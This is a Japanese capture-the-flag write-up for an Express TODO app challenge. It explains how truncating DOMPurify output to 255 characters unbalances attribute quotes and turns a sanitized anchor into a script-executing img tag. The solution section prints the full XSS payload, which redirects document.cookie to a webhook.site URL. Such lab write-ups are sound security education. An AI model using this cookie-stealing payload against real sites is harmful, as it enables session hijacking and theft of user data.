# TODO List

https://alpacahack.com/daily-bside/challenges/todo-list

## 問題の概要

Express 製の TODO リスト管理アプリケーションで XSS を発生させ、Cookie にフラグを持った Bot にアクセスさせてフラグを取得する問題です。

セッションごとに Todo を保持しており、`?sessionID=...` でセッションを指定して Bot にアクセスさせることができます。

### `GET /`

TODO リストの一覧が表示されます。

### `POST /todos`

`title` パラメータで指定された文字列を TODO リストに追加します。

## 問題を分析する

出力は `ejs` でテンプレートに変数を埋め込む形で行われており、基本的に `<%= %>` でエスケープして展開されます。

ただし、`todo` の出力だけはエスケープなしでの展開

```ejs
<% todos.forEach((todo) => { %>
  <li>
    <%- todo %>
  </li>
<% }) %>
```

になっており、代わりに保存時に `DOMPurify.sanitize` でサニタイズされています。

```js
app.post("/todos", async (req, res) => {
  const rawTitle = String(req.body.title || "").trim().slice(0, 255);
  const title = DOMPurify.sanitize(rawTitle).slice(0, 255);

  if (title) {
    const todos = todosBySession.get(req.sessionId) || [];
    todosBySession.set(req.sessionId, [title, ...todos]);
  }

  res.redirect("/");
});
```

いろいろ試したところ、`DOMPurify.sanitize` では `<b>hello</b>` のような HTML タグは許可されていますが、`<script>alert(1)</script>` や `<img src="x" onerror="alert(1)">` のようなスクリプトが実行されるタグや属性は取り除かれるようです。

一見 XSS は防がれているように見えますが、サニタイズ後の文字列が長い場合に 255 文字に切り詰めてしまっています。

サニタイズ後は安全だが文字列の後ろを切り詰めると危険になるような入力を考えれば XSS を発生させることができそうです。

## 解法

`"..."` の quotes の片方だけが切り詰められて消えるような入力を与えると quotes のバランスを崩すことができます。

- `<><a data-a="">a</a>`
- `<a data-a="><img src='x' onerror='location=``https://webhook.site/...../${document.cookie}``'>">img</a>`

のような入力はスクリプトが実行されない安全な HTML として次のようにレンダリングされます

```html
<ul class="todo-items">
  <li>
    &lt;&gt;<a data-a="">a</a>
  </li>
  <li>
    <a data-a="><img src='x' onerror='location=`https://webhook.site/...../${document.cookie}`'>">img</a>
  </li>
</ul>
```

しかし、サニタイズ後の `title` の内容が長い場合、255 文字に切り詰められてしまい、

```html
<ul class="todo-items">
  <li>
    &lt;&gt;&lt;&gt;&lt;&gt;......&lt;&gt;&lt;&gt;&lt;&gt;<a data-a="
  </li>
  <li>
    <a data-a="><img src='x' onerror='location=`https://webhook.site/...../${document.cookie}`'>">img</a>
  </li>
</ul>
```

のように quotes のバランスが崩れてスクリプトが実行されます。

## 解答に使用した入力

```html
<a data-a="><img src='x' onerror='location=`https://webhook.site/...../${document.cookie}`'>">img</a>
```
```html
<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><a data-a="">a</a>
```

## 感想

サニタイズした後の文字列を下手に加工すると脆弱性になるという問題でした。

はじめは掲示板のような global state ではなくセッションごとに TODO を管理しているのが何か鍵になるのか？と思いましたが、違ったようです(shared server にするための名残りでしょうか)。

個人的にシンプルな UI のデザインがかなり好みで、見習っていきたいと思いました。
